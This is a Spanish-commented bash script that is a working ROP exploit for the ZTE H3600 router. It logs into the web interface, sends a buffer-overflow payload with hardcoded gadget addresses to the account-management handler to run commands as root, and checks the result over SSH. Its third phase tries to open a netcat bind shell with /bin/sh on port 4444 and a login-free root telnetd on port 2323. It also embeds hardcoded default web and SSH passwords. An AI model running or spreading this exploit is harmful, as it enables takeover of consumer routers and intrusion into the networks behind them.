#!/bin/bash
# ZTE H3600 — ROP exploit + verificación automática via SSH
# Corre desde tu PC local que tiene acceso a 192.168.1.1
# Uso: ./pwn_h3600.sh

IP="${1:-192.168.1.1}"
HTTP_PWD="${2:-45788798}"
SSH_USER="${3:-admin}"
SSH_PASS="${4:-UkuGPeyRDU}"
SP_BASE="0xbefff000"
COOKIES=$(mktemp)
trap "rm -f $COOKIES" EXIT

SSH_CMD() { sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$SSH_USER@$IP" "$1" 2>/dev/null; }

#── Helpers ──────────────────────────────────────────────────────────────
make_payload() {
    python3 - "$1" "$2" <<'PYEOF'
import sys, base64, struct
p32 = lambda x: struct.pack("<I", x)
SYSTEM_PLT       = 0x0001a18c
POP_R3_R4_FP_PC  = 0x0001d150
MOV_R0_R4_BLX_R3 = 0x000545c8
JUNK             = p32(0xdeadbeef)
CMD      = sys.argv[2].encode() + b"\x00"
CMD_ADDR = int(sys.argv[1], 16) + 16
rop = (p32(POP_R3_R4_FP_PC) + p32(SYSTEM_PLT) + p32(CMD_ADDR) + JUNK + p32(MOV_R0_R4_BLX_R3))
print(base64.b64encode(CMD.ljust(516, b"A") + JUNK*6 + rop).decode())
PYEOF
}

url_enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.argv[1]),end='')" "$1"; }

do_login() {
    rm -f "$COOKIES"; touch "$COOKIES"
    curl -sk -c "$COOKIES" -b "$COOKIES" "https://$IP/" -o /dev/null
    TS=$(date +%s%3N)
    SALT=$(curl -sk -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=loginData&_tag=login_token&_=$TS" \
        | sed -nE 's/.*>([0-9A-Za-z]+)<.*/\1/p')
    PWHASH=$(printf '%s' "${HTTP_PWD}${SALT}" | sha256sum | cut -d' ' -f1)
    RESP=$(curl -sk -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=loginData&_tag=login_entry" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode "Password=$PWHASH" --data-urlencode "Username=user" \
        --data-urlencode "_sessionTOKEN=" --data-urlencode "action=login")
    SEED=$(echo "$RESP" | sed -nE 's/.*"sess_token":"([^"]+)".*/\1/p')
    TS=$(date +%s%3N)
    SALT=$(curl -sk -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=loginData&_tag=login_token&_=$TS" \
        | sed -nE 's/.*>([0-9A-Za-z]+)<.*/\1/p')
    PWHASH=$(printf '%s' "${HTTP_PWD}${SALT}" | sha256sum | cut -d' ' -f1)
    RESP=$(curl -sk -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=loginData&_tag=login_entry" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        --data-urlencode "Password=$PWHASH" --data-urlencode "Username=user" \
        --data-urlencode "_sessionTOKEN=$SEED" --data-urlencode "action=login")
    echo "$RESP" | grep -q "login_need_refresh.*true"
}

get_token() {
    TS=$(date +%s%3N)
    curl -sk -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=menuView&_tag=accountMgr&Menu3Location=0&_=$TS" \
        | python3 -c '
import sys,re
m=re.search(r"_sessionTmpToken\s*=\s*\"([^\"]+)\"",sys.stdin.read())
if m: print(re.sub(r"\\\\x([0-9a-fA-F]{2})",lambda x:chr(int(x.group(1),16)),m.group(1)))'
}

send_exploit() {
    local sp="$1" cmd="$2"
    local payload token body check
    payload=$(make_payload "$sp" "$cmd")
    token=$(get_token)
    [ -z "$token" ] && { echo "  [!] Sin token"; return 1; }
    body="IF_ACTION=Apply&_InstID=IGD.AU2&Right=2&Username=user&Password=A&FakePasPassword=&NewPassword=A&FakePasNewPassword=&FakePasNewConfirmPassword=&Btn_cancel_AccountManag=&Btn_apply_AccountManag=&encode=$(url_enc "$payload")&_sessionTOKEN=$token"
    check=$(printf '%s' "$body" | sha256sum | cut -d' ' -f1)
    curl -sk --max-time 15 -c "$COOKIES" -b "$COOKIES" \
        "https://$IP/?_type=menuData&_tag=devauth_accountmgr_lua.lua" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -H 'X-Requested-With: XMLHttpRequest' \
        -H "Check: $check" \
        --data "$body" -o /dev/null 2>/dev/null || true
}

wait_httpd() {
    echo -n "    Esperando httpd..."
    for i in $(seq 1 20); do
        sleep 1
        CODE=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://$IP/" 2>/dev/null) || true
        [ "$CODE" != "000" ] && { echo " OK (${i}s)"; return 0; }
        echo -n "."
    done
    echo " TIMEOUT"; return 1
}

#═══════════════════════════════════════════════════════════════════════════
echo "╔══════════════════════════════════════════════════╗"
echo "║  ZTE H3600 ROP exploit — pwn_h3600.sh           ║"
echo "╚══════════════════════════════════════════════════╝"
echo "[*] Target: $IP"
echo ""

#── FASE 1: verificar SSH funciona ───────────────────────────────────────
echo "[*] FASE 1: Verificando SSH ($SSH_USER@$IP)..."
if SSH_CMD 'echo ssh_ok' | grep -q ssh_ok; then
    echo "[+] SSH OK"
else
    echo "[-] SSH no responde — instala sshpass o verifica credenciales"
    echo "    sshpass -p '$SSH_PASS' ssh $SSH_USER@$IP"
fi
echo ""

#── FASE 2: prueba ROP con touch /tmp/pwned ──────────────────────────────
echo "[*] FASE 2: Probando ROP — cmd: touch /tmp/pwned"
SSH_CMD 'rm -f /tmp/pwned' 2>/dev/null || true

do_login || { echo "[!] Login HTTP fallido"; exit 1; }
echo "[+] Login HTTP OK"
send_exploit "$SP_BASE" "touch /tmp/pwned"
sleep 2

HTTP=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "https://$IP/" 2>/dev/null) || HTTP=000
if [ "$HTTP" = "000" ]; then
    echo "[!] httpd crasheado (SP incorrecto) — esperando restart..."
    wait_httpd
    echo "[-] ROP ejecutó pero SP_BASE errado — ajustar"
    exit 1
fi

echo -n "[*] Verificando /tmp/pwned via SSH... "
if SSH_CMD 'test -f /tmp/pwned && echo YES || echo NO' | grep -q YES; then
    echo "EXISTE ✓"
    echo "[+] ROP ejecuta comandos como root. SP_BASE=$SP_BASE correcto."
else
    echo "NO existe"
    echo "[-] httpd vivo pero ROP no ejecutó. Revisar gadgets."
    exit 1
fi
echo ""

#── FASE 3: reverse shell con /bin/sh via dropbear ───────────────────────
echo "[*] FASE 3: Intentando abrir shell..."

# Opcion A: dropbear en puerto 22 (ya conocemos la pass SSH)
echo "  [A] dropbear ya corre en puerto 22 con SSH existente."
echo "      Conectar: ssh $SSH_USER@$IP  (ya funciona)"
echo ""

# Opcion B: abrir puerto extra con nc pipe si existe
echo -n "  [B] Buscando nc/ncat en router... "
if SSH_CMD 'which nc ncat busybox 2>/dev/null' | grep -qE "nc|busybox"; then
    echo "encontrado"
    # Lanzar via ROP: nc -lp 4444 -e /bin/sh
    do_login
    send_exploit "$SP_BASE" "nc -lp 4444 -e /bin/sh &"
    sleep 2
    if nc -z -w3 "$IP" 4444 2>/dev/null; then
        echo "[+] nc escuchando en $IP:4444"
        echo "    Conectar: nc $IP 4444"
    else
        echo "[-] nc no abrió (no soporta -e)"
    fi
else
    echo "no hay nc"
fi

# Opcion C: escribir script y ejecutarlo
echo ""
echo "  [C] Escribiendo /tmp/shell.sh via SSH..."
SSH_CMD 'printf "#!/bin/sh\ntelnetd -p 2323 -l /bin/sh\n" > /tmp/shell.sh; chmod +x /tmp/shell.sh'
do_login
send_exploit "$SP_BASE" "/tmp/shell.sh"
sleep 2
if nc -z -w3 "$IP" 2323 2>/dev/null; then
    echo "[+] telnetd en $IP:2323"
    echo "    Conectar: telnet $IP 2323"
else
    echo "[-] Puerto 2323 no abierto (telnetd bloqueado)"
fi

echo ""
echo "[*] Done. Si nada funcionó, tienes SSH directo en $IP:22"
